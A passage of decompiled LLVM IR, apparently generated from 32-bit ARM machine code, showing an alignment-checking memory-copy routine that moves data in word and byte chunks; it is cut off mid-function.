  %v2_17350 = sub i32 %v0_17350, %v1_17350
  %v3_17350 = icmp ult i32 %v0_17350, %v1_17350
  %v4_17350 = xor i32 %v1_17350, %v0_17350
  %v5_17350 = xor i32 %v2_17350, %v0_17350
  %v6_17350 = and i32 %v5_17350, %v4_17350
  %v7_17350 = icmp slt i32 %v6_17350, 0
  store i1 %v7_17350, i1* %cpsr_v.global-to-local, align 1
  %v8_17350 = icmp slt i32 %v2_17350, 0
  store i1 %v8_17350, i1* %cpsr_n.global-to-local, align 1
  %v9_17350 = icmp eq i32 %v0_17350, %v1_17350
  store i1 %v9_17350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17350, label %dec_label_pc_175a4, label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %entry
  br i1 %v9_17350, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_17358
  %merge = phi i32 [ %v0_17350, %dec_label_pc_17358 ], [ %v2_17638, %bb150 ], [ %v11_17654, %bb153 ], [ %v7_17654, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17358
  %v5_1735c = inttoptr i32 %v1_17350 to i8*
  store i8* %v5_1735c, i8** %stack_var_-8, align 4
  %v8_1735c = load i32, i32* @lr, align 4
  %v0_17360 = load i32, i32* @r2, align 4
  %v2_17360 = add i32 %v0_17360, -4
  store i32 %v2_17360, i32* %r2.global-to-local, align 4
  %v4_17360 = sub i32 3, %v0_17360
  %v5_17360 = and i32 %v4_17360, %v0_17360
  %v6_17360 = icmp slt i32 %v5_17360, 0
  store i1 %v6_17360, i1* %cpsr_v.global-to-local, align 1
  %v7_17360 = icmp slt i32 %v2_17360, 0
  store i1 %v7_17360, i1* %cpsr_n.global-to-local, align 1
  %v8_17360 = icmp eq i32 %v0_17360, 4
  store i1 %v8_17360, i1* %cpsr_z.global-to-local, align 1
  %v5_17364 = icmp slt i32 %v0_17360, 4
  br i1 %v5_17364, label %bb140, label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %bb
  %v1_17368 = urem i32 %v1_17350, 4
  store i32 %v1_17368, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17368 = icmp eq i32 %v1_17368, 0
  store i1 %v2_17368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17368, label %dec_label_pc_17370, label %dec_label_pc_1741c

dec_label_pc_17370:                               ; preds = %dec_label_pc_17368
  %v1_17370 = urem i32 %v0_17350, 4
  store i32 %v1_17370, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17370 = icmp eq i32 %v1_17370, 0
  store i1 %v2_17370, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_17350 to i2
  br i1 %v2_17370, label %dec_label_pc_17378, label %dec_label_pc_1744c

dec_label_pc_17378:                               ; preds = %dec_label_pc_17370, %dec_label_pc_17444
  %v0_1739094 = phi i32 [ %v1_17350, %dec_label_pc_17370 ], [ %v0_1756c77, %dec_label_pc_17444 ]
  %v0_1738c93 = phi i32 [ %v0_17350, %dec_label_pc_17370 ], [ %v0_17444, %dec_label_pc_17444 ]
  %v0_17378 = phi i32 [ %v2_17360, %dec_label_pc_17370 ], [ %v2_1743c, %dec_label_pc_17444 ]
  %v1_17378 = add i32 %v0_17378, -8
  store i32 %v1_17378, i32* %r2.global-to-local, align 4
  %v3_17378 = sub i32 7, %v0_17378
  %v4_17378 = and i32 %v3_17378, %v0_17378
  %v5_17378 = icmp slt i32 %v4_17378, 0
  store i1 %v5_17378, i1* %cpsr_v.global-to-local, align 1
  %v6_17378 = icmp slt i32 %v1_17378, 0
  store i1 %v6_17378, i1* %cpsr_n.global-to-local, align 1
  %v7_17378 = icmp eq i32 %v0_17378, 8
  store i1 %v7_17378, i1* %cpsr_z.global-to-local, align 1
  %v2_1737c = xor i1 %v6_17378, %v5_17378
  br i1 %v2_1737c, label %dec_label_pc_173cc, label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_17378
  %v1_17380 = add i32 %v0_17378, -28
  store i32 %v1_17380, i32* %r2.global-to-local, align 4
  %v3_17380 = sub i32 27, %v0_17378
  %v4_17380 = and i32 %v3_17380, %v1_17378
  %v5_17380 = icmp slt i32 %v4_17380, 0
  store i1 %v5_17380, i1* %cpsr_v.global-to-local, align 1
  %v6_17380 = icmp slt i32 %v1_17380, 0
  store i1 %v6_17380, i1* %cpsr_n.global-to-local, align 1
  %v7_17380 = icmp eq i32 %v1_17378, 20
  store i1 %v7_17380, i1* %cpsr_z.global-to-local, align 1
  %v2_17384 = xor i1 %v6_17380, %v5_17380
  br i1 %v2_17384, label %dec_label_pc_173b8, label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %dec_label_pc_17380
  %v0_17388 = load i32, i32* @r4, align 4
  store i32 %v0_17388, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1738c

dec_label_pc_1738c:                               ; preds = %dec_label_pc_1738c.dec_label_pc_1738c_crit_edge, %dec_label_pc_17388
  %v0_17390 = phi i32 [ %v12_17398, %dec_label_pc_1738c.dec_label_pc_1738c_crit_edge ], [ %v0_1739094, %dec_label_pc_17388 ]
  %v0_1738c = phi i32 [ %v0_1738c.pre, %dec_label_pc_1738c.dec_label_pc_1738c_crit_edge ], [ %v0_1738c93, %dec_label_pc_17388 ]
  %v1_1738c = inttoptr i32 %v0_1738c to i32*
  %v2_1738c = load i32, i32* %v1_1738c, align 4
  %v3_1738c = add i32 %v0_1738c, 4
  %v4_1738c = inttoptr i32 %v3_1738c to i32*
  %v5_1738c = load i32, i32* %v4_1738c, align 4
  store i32 %v5_1738c, i32* %r4.global-to-local, align 4
  %v6_1738c = add i32 %v0_1738c, 8
  %v7_1738c = inttoptr i32 %v6_1738c to i32*
  %v8_1738c = load i32, i32* %v7_1738c, align 4
  store i32 %v8_1738c, i32* %ip.global-to-local, align 4
  %v9_1738c = add i32 %v0_1738c, 12
  %v10_1738c = inttoptr i32 %v9_1738c to i32*
  %v11_1738c = load i32, i32* %v10_1738c, align 4
  store i32 %v11_1738c, i32* %lr.global-to-local, align 4
  %v12_1738c = add i32 %v0_1738c, 16
  store i32 %v12_1738c, i32* %r1.global-to-local, align 4
  %v1_17390 = inttoptr i32 %v0_17390 to i32*
  store i32 %v2_1738c, i32* %v1_17390, align 4
  %v3_17390 = add i32 %v0_17390, 4
  %v4_17390 = inttoptr i32 %v3_17390 to i32*
  %v5_17390 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17390, i32* %v4_17390, align 4
  %v6_17390 = add i32 %v0_17390, 8
  %v7_17390 = inttoptr i32 %v6_17390 to i32*
  %v8_17390 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17390, i32* %v7_17390, align 4
  %v9_17390 = add i32 %v0_17390, 12
  %v10_17390 = inttoptr i32 %v9_17390 to i32*
  %v11_17390 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17390, i32* %v10_17390, align 4
  %v12_17390 = add i32 %v0_17390, 16
  store i32 %v12_17390, i32* %r0.global-to-local, align 4
  %v0_17394 = load i32, i32* %r1.global-to-local, align 4
  %v1_17394 = inttoptr i32 %v0_17394 to i32*
  %v2_17394 = load i32, i32* %v1_17394, align 4
  store i32 %v2_17394, i32* @r3, align 4
  %v3_17394 = add i32 %v0_17394, 4
  %v4_17394 = inttoptr i32 %v3_17394 to i32*
  %v5_17394 = load i32, i32* %v4_17394, align 4
  store i32 %v5_17394, i32* %r4.global-to-local, align 4
  %v6_17394 = add i32 %v0_17394, 8
  %v7_17394 = inttoptr i32 %v6_17394 to i32*
  %v8_17394 = load i32, i32* %v7_17394, align 4
  store i32 %v8_17394, i32* @ip, align 4
  %v9_17394 = add i32 %v0_17394, 12
  %v10_17394 = inttoptr i32 %v9_17394 to i32*
  %v11_17394 = load i32, i32* %v10_17394, align 4
  store i32 %v11_17394, i32* %lr.global-to-local, align 4
  %v12_17394 = add i32 %v0_17394, 16
  store i32 %v12_17394, i32* @r1, align 4
  %v1_17398 = inttoptr i32 %v12_17390 to i32*
  store i32 %v2_17394, i32* %v1_17398, align 4
  %v3_17398 = add i32 %v0_17390, 20
  %v4_17398 = inttoptr i32 %v3_17398 to i32*
  %v5_17398 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17398, i32* %v4_17398, align 4
  %v6_17398 = add i32 %v0_17390, 24
  %v7_17398 = inttoptr i32 %v6_17398 to i32*
  %v8_17398 = load i32, i32* @ip, align 4
  store i32 %v8_17398, i32* %v7_17398, align 4
  %v9_17398 = add i32 %v0_17390, 28
  %v10_17398 = inttoptr i32 %v9_17398 to i32*
  %v11_17398 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17398, i32* %v10_17398, align 4
  %v12_17398 = add i32 %v0_17390, 32
  store i32 %v12_17398, i32* @r0, align 4
  %v0_1739c = load i32, i32* %r2.global-to-local, align 4
  %v1_1739c = add i32 %v0_1739c, -32
  store i32 %v1_1739c, i32* %r2.global-to-local, align 4
  %v3_1739c = sub i32 31, %v0_1739c
  %v4_1739c = and i32 %v3_1739c, %v0_1739c
  %v5_1739c = icmp slt i32 %v4_1739c, 0
  %v6_1739c = icmp slt i32 %v1_1739c, 0
  %v2_173a0 = xor i1 %v6_1739c, %v5_1739c
  br i1 %v2_173a0, label %dec_label_pc_173a4, label %dec_label_pc_1738c.dec_label_pc_1738c_crit_edge

dec_label_pc_1738c.dec_label_pc_1738c_crit_edge:  ; preds = %dec_label_pc_1738c
  %v0_1738c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1738c

dec_label_pc_173a4:                               ; preds = %dec_label_pc_1738c
  %v1_173a4 = add i32 %v0_1739c, -16
  %v3_173a4 = add i32 %v0_1739c, 2147483616
  %v4_173a4 = and i32 %v1_173a4, %v3_173a4
  %v5_173a4 = icmp slt i32 %v4_173a4, 0
  store i1 %v5_173a4, i1* %cpsr_v.global-to-local, align 1
  %v6_173a4 = icmp slt i32 %v1_173a4, 0
  store i1 %v6_173a4, i1* %cpsr_n.global-to-local, align 1
  %v7_173a4 = icmp eq i32 %v1_173a4, 0
  store i1 %v7_173a4, i1* %cpsr_z.global-to-local, align 1
  %v2_173a8 = xor i1 %v6_173a4, %v5_173a4
  br i1 %v2_173a8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_173a4
  %v3_173a8 = load i32, i32* @r1, align 4
  %v4_173a8 = inttoptr i32 %v3_173a8 to i32*
  %v5_173a8 = load i32, i32* %v4_173a8, align 4
  store i32 %v5_173a8, i32* @r3, align 4
  %v6_173a8 = add i32 %v3_173a8, 4
  %v7_173a8 = inttoptr i32 %v6_173a8 to i32*
  %v8_173a8 = load i32, i32* %v7_173a8, align 4
  store i32 %v8_173a8, i32* %r4.global-to-local, align 4
  %v9_173a8 = add i32 %v3_173a8, 8
  %v10_173a8 = inttoptr i32 %v9_173a8 to i32*
  %v11_173a8 = load i32, i32* %v10_173a8, align 4
  store i32 %v11_173a8, i32* @ip, align 4
  %v12_173a8 = add i32 %v3_173a8, 12
  %v13_173a8 = inttoptr i32 %v12_173a8 to i32*
  %v14_173a8 = load i32, i32* %v13_173a8, align 4
  store i32 %v14_173a8, i32* %lr.global-to-local, align 4
  %v15_173a8 = add i32 %v3_173a8, 16
  store i32 %v15_173a8, i32* @r1, align 4
  %v4_173ac = inttoptr i32 %v12_17398 to i32*
  store i32 %v5_173a8, i32* %v4_173ac, align 4
  %v6_173ac = add i32 %v0_17390, 36
  %v7_173ac = inttoptr i32 %v6_173ac to i32*
  %v8_173ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_173ac, i32* %v7_173ac, align 4
  %v9_173ac = add i32 %v0_17390, 40
  %v10_173ac = inttoptr i32 %v9_173ac to i32*
  %v11_173ac = load i32, i32* @ip, align 4
  store i32 %v11_173ac, i32* %v10_173ac, align 4
  %v12_173ac = add i32 %v0_17390, 44
  %v13_173ac = inttoptr i32 %v12_173ac to i32*
  %v14_173ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_173ac, i32* %v13_173ac, align 4
  %v15_173ac = add i32 %v0_17390, 48
  store i32 %v15_173ac, i32* @r0, align 4
  %v3_173b0 = load i32, i32* %r2.global-to-local, align 4
  %v4_173b0 = add i32 %v3_173b0, -16
  store i32 %v4_173b0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_173a4, %bb136
  %v3_173c0102111 = phi i32 [ %v15_173ac, %bb136 ], [ %v12_17398, %dec_label_pc_173a4 ]
  %v0_173b8.pre = phi i32 [ %v4_173b0, %bb136 ], [ %v1_1739c, %dec_label_pc_173a4 ]
  %v2_173b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173b4, i32* @r4, align 4
  br label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %dec_label_pc_17380, %bb137
  %v3_173c0101 = phi i32 [ %v0_1739094, %dec_label_pc_17380 ], [ %v3_173c0102111, %bb137 ]
  %v0_173b8 = phi i32 [ %v1_17380, %dec_label_pc_17380 ], [ %v0_173b8.pre, %bb137 ]
  %v1_173b8 = add i32 %v0_173b8, 20
  store i32 %v1_173b8, i32* %r2.global-to-local, align 4
  %v3_173b8 = sub i32 0, %v0_173b8
  %v4_173b8 = and i32 %v1_173b8, %v3_173b8
  %v5_173b8 = icmp slt i32 %v4_173b8, 0
  store i1 %v5_173b8, i1* %cpsr_v.global-to-local, align 1
  %v6_173b8 = icmp slt i32 %v1_173b8, 0
  store i1 %v6_173b8, i1* %cpsr_n.global-to-local, align 1
  %v7_173b8 = icmp eq i32 %v1_173b8, 0
  store i1 %v7_173b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_173bc

dec_label_pc_173bc:                               ; preds = %.thread115, %dec_label_pc_173b8
  %v0_173cc.pre157 = phi i32 [ %v0_173cc.pre, %.thread115 ], [ %v1_173b8, %dec_label_pc_173b8 ]
  %v3_173c0 = phi i32 [ %v3_173c099116, %.thread115 ], [ %v3_173c0101, %dec_label_pc_173b8 ]
  %v1_173c4 = phi i1 [ %v1_173c8, %.thread115 ], [ %v5_173b8, %dec_label_pc_173b8 ]
  %v0_173c4 = phi i1 [ %v0_173c8, %.thread115 ], [ %v6_173b8, %dec_label_pc_173b8 ]
  %v2_173bc = xor i1 %v1_173c4, %v0_173c4
  br i1 %v2_173bc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_173bc
  %v3_173bc = load i32, i32* @r1, align 4
  %v4_173bc = inttoptr i32 %v3_173bc to i32*
  %v5_173bc = load i32, i32* %v4_173bc, align 4
  store i32 %v5_173bc, i32* @r3, align 4
  %v6_173bc = add i32 %v3_173bc, 4
  %v7_173bc = inttoptr i32 %v6_173bc to i32*
  %v8_173bc = load i32, i32* %v7_173bc, align 4
  store i32 %v8_173bc, i32* @ip, align 4
  %v9_173bc = add i32 %v3_173bc, 8
  %v10_173bc = inttoptr i32 %v9_173bc to i32*
  %v11_173bc = load i32, i32* %v10_173bc, align 4
  store i32 %v11_173bc, i32* %lr.global-to-local, align 4
  %v12_173bc = add i32 %v3_173bc, 12
  store i32 %v12_173bc, i32* @r1, align 4
  %v4_173c0 = inttoptr i32 %v3_173c0 to i32*
  store i32 %v5_173bc, i32* %v4_173c0, align 4
  %v6_173c0 = add i32 %v3_173c0, 4
  %v7_173c0 = inttoptr i32 %v6_173c0 to i32*
  %v8_173c0 = load i32, i32* @ip, align 4
  store i32 %v8_173c0, i32* %v7_173c0, align 4
  %v9_173c0 = add i32 %v3_173c0, 8
  %v10_173c0 = inttoptr i32 %v9_173c0 to i32*
  %v11_173c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_173c0, i32* %v10_173c0, align 4
  %v12_173c0 = add i32 %v3_173c0, 12
  store i32 %v12_173c0, i32* @r0, align 4
  %v3_173c4 = load i32, i32* %r2.global-to-local, align 4
  %v4_173c4 = add i32 %v3_173c4, -12
  store i32 %v4_173c4, i32* %r2.global-to-local, align 4
  %v6_173c4 = sub i32 11, %v3_173c4
  %v7_173c4 = and i32 %v6_173c4, %v3_173c4
  %v8_173c4 = icmp slt i32 %v7_173c4, 0
  store i1 %v8_173c4, i1* %cpsr_v.global-to-local, align 1
  %v9_173c4 = icmp slt i32 %v4_173c4, 0
  store i1 %v9_173c4, i1* %cpsr_n.global-to-local, align 1
  %v10_173c4 = icmp eq i32 %v3_173c4, 12
  store i1 %v10_173c4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_173bc, %bb138
  %v0_173cc.pre = phi i32 [ %v4_173c4, %bb138 ], [ %v0_173cc.pre157, %dec_label_pc_173bc ]
  %v3_173c099116 = phi i32 [ %v12_173c0, %bb138 ], [ %v3_173c0, %dec_label_pc_173bc ]
  %v1_173c8 = phi i1 [ %v8_173c4, %bb138 ], [ %v1_173c4, %dec_label_pc_173bc ]
  %v0_173c8 = phi i1 [ %v9_173c4, %bb138 ], [ %v0_173c4, %dec_label_pc_173bc ]
  %v2_173c8 = xor i1 %v1_173c8, %v0_173c8
  br i1 %v2_173c8, label %dec_label_pc_173cc, label %dec_label_pc_173bc

dec_label_pc_173cc:                               ; preds = %.thread115, %dec_label_pc_17378
  %v4_173dc = phi i32 [ %v0_1739094, %dec_label_pc_17378 ], [ %v3_173c099116, %.thread115 ]
  %v0_173cc = phi i32 [ %v1_17378, %dec_label_pc_17378 ], [ %v0_173cc.pre, %.thread115 ]
  %v1_173cc = add i32 %v0_173cc, 8
  store i32 %v1_173cc, i32* %r2.global-to-local, align 4
  %v3_173cc = sub i32 0, %v0_173cc
  %v4_173cc = and i32 %v1_173cc, %v3_173cc
  %v5_173cc = icmp slt i32 %v4_173cc, 0
  store i1 %v5_173cc, i1* %cpsr_v.global-to-local, align 1
  %v6_173cc = icmp slt i32 %v1_173cc, 0
  store i1 %v6_173cc, i1* %cpsr_n.global-to-local, align 1
  %v7_173cc = icmp eq i32 %v1_173cc, 0
  store i1 %v7_173cc, i1* %cpsr_z.global-to-local, align 1
  %v2_173d0 = xor i1 %v6_173cc, %v5_173cc
  br i1 %v2_173d0, label %bb140, label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %dec_label_pc_173cc
  %v1_173d4 = add i32 %v0_173cc, 4
  store i32 %v1_173d4, i32* %r2.global-to-local, align 4
  %v3_173d4 = sub i32 -5, %v0_173cc
  %v4_173d4 = and i32 %v3_173d4, %v1_173cc
  %v5_173d4 = icmp slt i32 %v4_173d4, 0
  store i1 %v5_173d4, i1* %cpsr_v.global-to-local, align 1
  %v6_173d4 = icmp slt i32 %v1_173d4, 0
  store i1 %v6_173d4, i1* %cpsr_n.global-to-local, align 1
  %v7_173d4 = icmp eq i32 %v1_173cc, 4
  store i1 %v7_173d4, i1* %cpsr_z.global-to-local, align 1
  %v2_173d8 = xor i1 %v6_173d4, %v5_173d4
  %v3_173d8 = load i32, i32* @r1, align 4
  %v4_173d8 = inttoptr i32 %v3_173d8 to i32*
  %v5_173d8 = load i32, i32* %v4_173d8, align 4
  store i32 %v5_173d8, i32* @r3, align 4
  %v7_173d8 = add i32 %v3_173d8, 4
  br i1 %v2_173d8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_173d4
  store i32 %v7_173d8, i32* @r1, align 4
  %v5_173dc = inttoptr i32 %v4_173dc to i32*
  store i32 %v5_173d8, i32* %v5_173dc, align 4
  %v6_173dc = load i32, i32* @r0, align 4
  %v7_173dc = add i32 %v6_173dc, 4
  store i32 %v7_173dc, i32* @r0, align 4
  %v0_173ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_173d4
  %v7_173e0 = inttoptr i32 %v7_173d8 to i32*
  %v8_173e0 = load i32, i32* %v7_173e0, align 4
  store i32 %v8_173e0, i32* @ip, align 4
  %v9_173e0 = add i32 %v3_173d8, 8
  store i32 %v9_173e0, i32* @r1, align 4
  %v4_173e4 = inttoptr i32 %v4_173dc to i32*
  store i32 %v5_173d8, i32* %v4_173e4, align 4
  %v6_173e4 = add i32 %v4_173dc, 4
  %v7_173e4 = inttoptr i32 %v6_173e4 to i32*
  %v8_173e4 = load i32, i32* @ip, align 4
  store i32 %v8_173e4, i32* %v7_173e4, align 4
  %v9_173e4 = add i32 %v4_173dc, 8
  store i32 %v9_173e4, i32* @r0, align 4
  %v3_173e8 = load i32, i32* %r2.global-to-local, align 4
  %v4_173e8 = add i32 %v3_173e8, -4
  store i32 %v4_173e8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_173cc, %bb, %dec_label_pc_1759c, %dec_label_pc_17530, %dec_label_pc_174c4, %bb139
  %v0_173ec = phi i32 [ %v0_173ec.pre, %.thread122 ], [ %v2_1743c, %.thread128 ], [ %v1_173cc, %dec_label_pc_173cc ], [ %v2_17360, %bb ], [ %v0_173ec61, %dec_label_pc_1759c ], [ %v0_173ec60, %dec_label_pc_17530 ], [ %v0_173ec59, %dec_label_pc_174c4 ], [ %v4_173e8, %bb139 ]
  %v1_173ec = add i32 %v0_173ec, 4
  store i32 %v1_173ec, i32* %r2.global-to-local, align 4
  %v3_173ec = sub i32 0, %v0_173ec
  %v4_173ec = and i32 %v1_173ec, %v3_173ec
  %v5_173ec = icmp slt i32 %v4_173ec, 0
  store i1 %v5_173ec, i1* %cpsr_v.global-to-local, align 1
  %v6_173ec = icmp slt i32 %v1_173ec, 0
  store i1 %v6_173ec, i1* %cpsr_n.global-to-local, align 1
  %v7_173ec = icmp eq i32 %v1_173ec, 0
  store i1 %v7_173ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173ec, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_173f4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_173f0 = load i8*, i8** %stack_var_-8, align 4
  %v4_173f0 = ptrtoint i8* %v3_173f0 to i32
  store i32 %v4_173f0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_173f4 = phi i32 [ %v0_173f4.pre, %bb140.bb142_crit_edge ], [ %v8_1735c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_173ec, i32 %v0_173f4)
  %v0_173f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_173f8 = add i32 %v0_173f8, -2
  %v3_173f8 = sub i32 1, %v0_173f8
  %v4_173f8 = and i32 %v3_173f8, %v0_173f8
  %v5_173f8 = icmp slt i32 %v4_173f8, 0
  store i1 %v5_173f8, i1* %cpsr_v.global-to-local, align 1
  %v6_173f8 = icmp slt i32 %v1_173f8, 0
  store i1 %v6_173f8, i1* %cpsr_n.global-to-local, align 1
  %v7_173f8 = icmp eq i32 %v0_173f8, 2
  store i1 %v7_173f8, i1* %cpsr_z.global-to-local, align 1
  %v0_173fc = load i32, i32* @r1, align 4
  %v1_173fc = inttoptr i32 %v0_173fc to i8*
  %v2_173fc = load i8, i8* %v1_173fc, align 1
  %v5_173fc = add i32 %v0_173fc, 1
  store i32 %v5_173fc, i32* %r1.global-to-local, align 4
  %v2_17400 = load i32, i32* @r0, align 4
  %v3_17400 = inttoptr i32 %v2_17400 to i8*
  store i8 %v2_173fc, i8* %v3_17400, align 1
  %v4_17400 = load i32, i32* @r0, align 4
  %v5_17400 = add i32 %v4_17400, 1
  store i32 %v5_17400, i32* %r0.global-to-local, align 4
  %v0_17404 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17404 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17404 = xor i1 %v0_17404, %v1_17404
  br i1 %v2_17404, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17404 = load i32, i32* %r1.global-to-local, align 4
  %v4_17404 = inttoptr i32 %v3_17404 to i8*
  %v5_17404 = load i8, i8* %v4_17404, align 1
  %v8_17404 = add i32 %v3_17404, 1
  store i32 %v8_17404, i32* %r1.global-to-local, align 4
  %v6_17408 = inttoptr i32 %v5_17400 to i8*
  store i8 %v5_17404, i8* %v6_17408, align 1
  %v7_17408 = load i32, i32* %r0.global-to-local, align 4
  %v8_17408 = add i32 %v7_17408, 1
  store i32 %v8_17408, i32* %r0.global-to-local, align 4
  %v1_1740c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1740c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17410 = phi i32 [ %v8_17408, %bb143 ], [ %v5_17400, %bb142 ]
  %v2_17410 = phi i1 [ %v2_1740c.pre, %bb143 ], [ %v1_17404, %bb142 ]
  %v1_17410 = phi i1 [ %v1_1740c.pre, %bb143 ], [ %v0_17404, %bb142 ]
  %v0_1740c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1740c = xor i1 %v2_17410, %v1_17410
  %v4_1740c = or i1 %v0_1740c, %v3_1740c
  br i1 %v4_1740c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1740c = load i32, i32* %r1.global-to-local, align 4
  %v6_1740c = inttoptr i32 %v5_1740c to i8*
  %v7_1740c = load i8, i8* %v6_1740c, align 1
  %v10_1740c = add i32 %v5_1740c, 1
  store i32 %v10_1740c, i32* %r1.global-to-local, align 4
  %v8_17410 = inttoptr i32 %v7_17410 to i8*
  store i8 %v7_1740c, i8* %v8_17410, align 1
  %v9_17410 = load i32, i32* %r0.global-to-local, align 4
  %v10_17410 = add i32 %v9_17410, 1
  store i32 %v10_17410, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17414 = load i8*, i8** %stack_var_-8, align 4
  %v3_17414 = ptrtoint i8* %v2_17414 to i32
  store i32 %v3_17414, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1735c)
  %v0_1741c.pre = load i32, i32* @ip, align 4
  %v0_17424.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_17428.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1741c

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17368, %.thread126
  %v2_17428 = phi i32 [ %v1_17350, %dec_label_pc_17368 ], [ %v2_17428.pre, %.thread126 ]
  %v0_17424 = phi i32 [ %v0_17350, %dec_label_pc_17368 ], [ %v0_17424.pre, %.thread126 ]
  %v0_1741c = phi i32 [ %v1_17368, %dec_label_pc_17368 ], [ %v0_1741c.pre, %.thread126 ]
  %v1_1741c = sub i32 4, %v0_1741c
  store i32 %v1_1741c, i32* @ip, align 4
  %v1_17420 = add i32 %v1_1741c, -2
  %v3_17420 = sub i32 1, %v1_1741c
  %v4_17420 = and i32 %v3_17420, %v1_1741c
  %v5_17420 = icmp slt i32 %v4_17420, 0
  store i1 %v5_17420, i1* %cpsr_v.global-to-local, align 1
  %v6_17420 = icmp slt i32 %v1_17420, 0
  store i1 %v6_17420, i1* %cpsr_n.global-to-local, align 1
  %v7_17420 = icmp eq i32 %v1_1741c, 2
  store i1 %v7_17420, i1* %cpsr_z.global-to-local, align 1
  %v1_17424 = inttoptr i32 %v0_17424 to i8*
  %v2_17424 = load i8, i8* %v1_17424, align 1
  %v3_17424 = zext i8 %v2_17424 to i32
  store i32 %v3_17424, i32* @r3, align 4
  %v5_17424 = add i32 %v0_17424, 1
  store i32 %v5_17424, i32* @r1, align 4
  %v3_17428 = inttoptr i32 %v2_17428 to i8*
  store i8 %v2_17424, i8* %v3_17428, align 1
  %v4_17428 = load i32, i32* @r0, align 4
  %v5_17428 = add i32 %v4_17428, 1
  store i32 %v5_17428, i32* @r0, align 4
  %v0_1742c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1742c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1742c = xor i1 %v0_1742c, %v1_1742c
  br i1 %v2_1742c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1741c
  %v3_1742c = load i32, i32* @r1, align 4
  %v4_1742c = inttoptr i32 %v3_1742c to i8*
  %v5_1742c = load i8, i8* %v4_1742c, align 1
  %v6_1742c = zext i8 %v5_1742c to i32
  store i32 %v6_1742c, i32* @r3, align 4
  %v8_1742c = add i32 %v3_1742c, 1
  store i32 %v8_1742c, i32* @r1, align 4
  %v6_17430 = inttoptr i32 %v5_17428 to i8*
  store i8 %v5_1742c, i8* %v6_17430, align 1
  %v7_17430 = load i32, i32* @r0, align 4
  %v8_17430 = add i32 %v7_17430, 1
  store i32 %v8_17430, i32* @r0, align 4
  %v1_17434.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17434.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1741c, %bb145
  %v7_17438 = phi i32 [ %v8_17430, %bb145 ], [ %v5_17428, %dec_label_pc_1741c ]
  %v2_17438 = phi i1 [ %v2_17434.pre, %bb145 ], [ %v1_1742c, %dec_label_pc_1741c ]
  %v1_17438 = phi i1 [ %v1_17434.pre, %bb145 ], [ %v0_1742c, %dec_label_pc_1741c ]
  %v0_17434 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17434 = xor i1 %v2_17438, %v1_17438
  %v4_17434 = or i1 %v0_17434, %v3_17434
  br i1 %v4_17434, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_17434 = load i32, i32* @r1, align 4
  %v6_17434 = inttoptr i32 %v5_17434 to i8*
  %v7_17434 = load i8, i8* %v6_17434, align 1
